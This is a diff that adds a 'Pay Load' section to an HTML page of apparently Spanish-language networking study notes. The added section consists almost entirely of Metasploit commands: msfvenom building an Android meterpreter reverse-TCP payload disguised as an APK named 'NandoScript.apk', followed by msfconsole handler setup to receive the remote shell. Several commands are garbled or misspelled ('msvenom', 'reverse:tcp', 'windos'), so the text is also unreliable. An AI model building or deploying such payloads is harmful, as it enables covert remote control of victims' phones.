@@ -147,5 +147,33 @@ Netsh: permite modificar, administrar y diagnosticar la configuración de una re
             </p>
 
 
+
+
+
+
+            
+
+            <h2>Pay Load:</h2>
+            <p>
+                Kali Pay Load:
+                <div></div>
+sudo du
+<div></div>
+msvenom   'windos'                                          '-f exe'         'exe'
+msvenom -p android/meterpreter/reverse:tcp Lhost=ip Lport=4444 R> NandoScript.apk
+<div></div>
+msfconsole
+<div></div>
+>use exploit/multi/handler
+<div></div>
+>set payload android/meterpreter/reverse_tcp
+<div></div>
+>set Lhost ip
+<div></div>
+>set lport 4444
+<div></div>
+>exploit
+         </p>
+
 </body>
 </html>
